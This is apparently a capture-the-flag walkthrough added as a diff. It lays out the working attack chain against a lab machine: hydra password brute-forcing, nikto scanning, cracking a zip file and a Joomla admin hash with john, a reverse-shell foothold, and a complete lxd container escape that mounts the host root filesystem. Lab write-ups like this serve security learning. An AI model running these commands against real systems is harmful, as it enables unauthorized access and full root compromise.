@@ -1,0 +1,45 @@
+We Got Username from secret file which is Joker we can bruteforce http-get using hydra to get password :
+ hydra -l joker -P /usr/share/wordlists/rockyou.txt -s 8080 10.10.117.150 http-get
+
+[8080][http-get] host: 10.10.117.150   login: joker   password: hannah
+
+nikto -id joker:hannah -h http://10.10.117.150:8080/
+We got directory & backup file
+
+Uing zip2john
+
+backup.zip:hannah::backup.zip:site/libraries/vendor/phpmailer/phpmailer/VERSION, site/libraries/phpass/PasswordHash.php, db/joomladb.sql:backup.zip
+
+we got db file
+where we found super duper user
+
+grep cc1gr_users joomladb.sql 
+-- Table structure for table `cc1gr_users`
+DROP TABLE IF EXISTS `cc1gr_users`;
+CREATE TABLE `cc1gr_users` (
+-- Dumping data for table `cc1gr_users`
+LOCK TABLES `cc1gr_users` WRITE;
+/*!40000 ALTER TABLE `cc1gr_users` DISABLE KEYS */;
+INSERT INTO `cc1gr_users` VALUES (547,'Super Duper User','admin','admin@example.com','$2y$10$b43UqoH5UpXokj2y9e/8U.LD8T3jEQCuxG2oHzALoJaj9M5unOcbG',0,1,'2019-10-08 12:00:15','2019-10-25 15:20:02','0','{\"admin_style\":\"\",\"admin_language\":\"\",\"language\":\"\",\"editor\":\"\",\"helpsite\":\"\",\"timezone\":\"\"}','0000-00-00 00:00:00',0,'','',0);
+/*!40000 ALTER TABLE `cc1gr_users` ENABLE KEYS */;
+
+john admin.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+Password :  abcd1234
+after upload reverseshell
+get active user which is www-data 
+we find lxd which mean linux container
+we can swamp shell using python
+
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+exploit lxd using git clone https://github.com/saghul/lxd-alpine-builder.git
+
+lxc image import alpine-v3.12-x86_64-20200919_1921.tar.gz --alias myalpine
+lxc init myalpine joker -c security.privileged=true
+lxc config device add joker mydevice disk source=/ path=/mnt/root recursive=true
+lxc start joker
+lxc exec joker /bin/sh
+cd /mnt/root/root
+yeah final result final.txt
+
+
+
